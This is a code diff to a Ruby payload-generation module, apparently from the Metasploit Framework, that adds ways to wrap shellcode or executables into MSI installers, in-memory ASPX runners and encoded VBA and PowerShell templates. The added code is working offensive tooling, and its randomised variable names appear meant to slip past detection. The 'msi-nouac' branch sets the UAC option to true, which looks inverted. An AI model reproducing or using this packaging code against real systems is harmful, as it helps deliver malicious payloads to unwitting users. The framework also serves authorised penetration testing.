@@ -13,6 +13,7 @@ class EXE
 require 'rex'
 require 'rex/peparsey'
 require 'rex/pescan'
+require 'rex/random_identifier_generator'
 require 'rex/zip'
 require 'metasm'
 require 'digest/sha1'
@@ -26,7 +27,7 @@ require 'msf/core/exe/segment_injector'
 
   def self.set_template_default(opts, exe = nil, path = nil)
     # If no path specified, use the default one.
-    path ||= File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates")
+    path ||= File.join(Msf::Config.data_directory, "templates")
 
     # If there's no default name, we must blow it up.
     if not exe
@@ -57,7 +58,7 @@ require 'msf/core/exe/segment_injector'
   end
 
   def self.read_replace_script_template(filename, hash_sub)
-    template_pathname = File.join(Msf::Config.install_root, "data", "templates", "scripts", filename)
+    template_pathname = File.join(Msf::Config.data_directory, "templates", "scripts", filename)
 
     template = ''
     File.open(template_pathname, "rb") do |f|
@@ -168,21 +169,11 @@ require 'msf/core/exe/segment_injector'
     payload = win32_rwx_exec(code)
 
     # Create a new PE object and run through sanity checks
-    endjunk = true
     fsize = File.size(opts[:template])
     pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
     text = nil
-    sections_end = 0
     pe.sections.each do |sec|
       text = sec if sec.name == ".text"
-      sections_end = sec.size + sec.file_offset if sec.file_offset >= sections_end
-      endjunk = false if sec.contains_file_offset?(fsize-1)
-    end
-    #also check to see if there is a certificate
-    cert_entry = pe.hdr.opt['DataDirectory'][4]
-    #if the cert is the only thing past the sections, we can handle.
-    if cert_entry.v['VirtualAddress'] + cert_entry.v['Size'] >= fsize and sections_end >= cert_entry.v['VirtualAddress']
-      endjunk = false
     end
 
     #try to inject code into executable by adding a section without affecting executable behavior
@@ -488,6 +479,66 @@ require 'msf/core/exe/segment_injector'
     exe_sub_method(code,opts)
   end
 
+  #
+  #   Wraps an executable inside a Windows
+  #    .msi file for auto execution when run
+  #
+  def self.to_exe_msi(framework, exe, opts={})
+    if opts[:uac]
+      opts[:msi_template] ||= "template_windows.msi"
+    else
+      opts[:msi_template] ||= "template_nouac_windows.msi"
+    end
+    return replace_msi_buffer(exe, opts)
+  end
+
+  def self.replace_msi_buffer(pe, opts)
+    opts[:msi_template_path] ||= File.join(Msf::Config.data_directory, "templates")
+
+    if opts[:msi_template].include?(File::SEPARATOR)
+      template = opts[:msi_template]
+    else
+      template = File.join(opts[:msi_template_path], opts[:msi_template])
+    end
+
+    msi = ''
+    File.open(template, "rb") { |fd|
+      msi = fd.read(fd.stat.size)
+    }
+
+    section_size =	2**(msi[30..31].unpack('s')[0])
+    sector_allocation_table = msi[section_size..section_size*2].unpack('l*')
+
+    buffer_chain = []
+    current_secid = 5	# This is closely coupled with the template provided and ideally
+          # would be calculated from the dir stream?
+
+    until current_secid == -2
+      buffer_chain << current_secid
+      current_secid = sector_allocation_table[current_secid]
+    end
+
+    buffer_size = buffer_chain.length * section_size
+
+    if pe.size > buffer_size
+      raise RuntimeError, "MSI Buffer is not large enough to hold the PE file"
+    end
+
+    pe_block_start = 0
+    pe_block_end = pe_block_start + section_size - 1
+
+    buffer_chain.each do |section|
+      block_start = section_size * (section + 1)
+      block_end = block_start + section_size - 1
+      pe_block = [pe[pe_block_start..pe_block_end]].pack("a#{section_size}")
+      msi[block_start..block_end] = pe_block
+      pe_block_start = pe_block_end + 1
+      pe_block_end += section_size
+    end
+
+    return msi
+  end
+
   def self.to_osx_arm_macho(framework, code, opts={})
 
     # Allow the user to specify their own template
@@ -763,8 +814,8 @@ def self.to_vba(framework,code,opts={})
     persist = opts[:persist] || false
 
     hash_sub = {}
-    hash_sub[:var_shellcode] = ""
-    hash_sub[:var_bytes]   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+    hash_sub[:var_shellcode] = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:exe_filename] = Rex::Text.rand_text_alpha(rand(8)+8) << '.exe'
     hash_sub[:var_fname]   = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_func]    = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_stream]  = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -774,7 +825,7 @@ def self.to_vba(framework,code,opts={})
     hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)
 
-    hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
+    hash_sub[:hex_shellcode] = exes.unpack('H*').join('')
 
     hash_sub[:init] = ""
 
@@ -822,6 +873,21 @@ def self.to_vba(framework,code,opts={})
     return read_replace_script_template("to_exe.aspx.template", hash_sub)
   end
 
+  def self.to_mem_aspx(framework, code, exeopts={})
+    # Intialize rig and value names
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:var_funcAddr)
+    rig.init_var(:var_hThread)
+    rig.init_var(:var_pInfo)
+    rig.init_var(:var_threadId)
+    rig.init_var(:var_bytearray)
+
+    hash_sub = rig.to_h
+    hash_sub[:shellcode] = Rex::Text.to_csharp(code, 100, rig[:var_bytearray])
+  
+    return read_replace_script_template("to_mem.aspx.template", hash_sub)
+  end
+
   def self.to_win32pe_psh_net(framework, code, opts={})
     hash_sub = {}
     hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
@@ -834,7 +900,7 @@ def self.to_vba(framework,code,opts={})
     hash_sub[:var_compileParams] 	= Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
 
-    hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
+    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
 
     return read_replace_script_template("to_mem_dotnet.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
   end
@@ -1532,6 +1598,9 @@ def self.to_vba(framework,code,opts={})
       output = Msf::Util::EXE.to_exe_asp(exe, exeopts)
 
     when 'aspx'
+        output = Msf::Util::EXE.to_mem_aspx(framework, code, exeopts)
+
+    when 'aspx-exe'
       exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
       output = Msf::Util::EXE.to_exe_aspx(exe, exeopts)
 
@@ -1566,6 +1635,25 @@ def self.to_vba(framework,code,opts={})
         when ARCH_X86_64  then to_winpe_only(framework, code, exeopts, arch)
         when ARCH_X64     then to_winpe_only(framework, code, exeopts, arch)
         end
+
+    when 'msi'
+      case arch
+        when ARCH_X86,nil
+          exe = to_win32pe(framework, code, exeopts)
+        when ARCH_X86_64,ARCH_X64
+          exe = to_win64pe(framework, code, exeopts)
+      end
+      output = Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)
+
+    when 'msi-nouac'
+      case arch
+        when ARCH_X86,nil
+          exe = to_win32pe(framework, code, exeopts)
+        when ARCH_X86_64,ARCH_X64
+          exe = to_win64pe(framework, code, exeopts)
+      end
+      exeopts[:uac] = true
+      output = Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)
 
     when 'elf'
       if (not plat or (plat.index(Msf::Module::Platform::Linux)))
@@ -1631,8 +1719,25 @@ def self.to_vba(framework,code,opts={})
 
   def self.to_executable_fmt_formats
     [
-      'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
-      'vbs','loop-vbs','asp','aspx','war','psh','psh-net'
+      "asp",
+      "aspx",
+      "aspx-exe",
+      "dll",
+      "elf",
+      "exe",
+      "exe-only",
+      "exe-service",
+      "exe-small",
+      "loop-vbs",
+      "macho",
+      "msi",
+      "msi-nouac",
+      "psh",
+      "psh-net",
+      "vba",
+      "vba-exe",
+      "vbs",
+      "war"
     ]
   end
 
@@ -1659,4 +1764,3 @@ def self.to_vba(framework,code,opts={})
 end
 end
 end
-
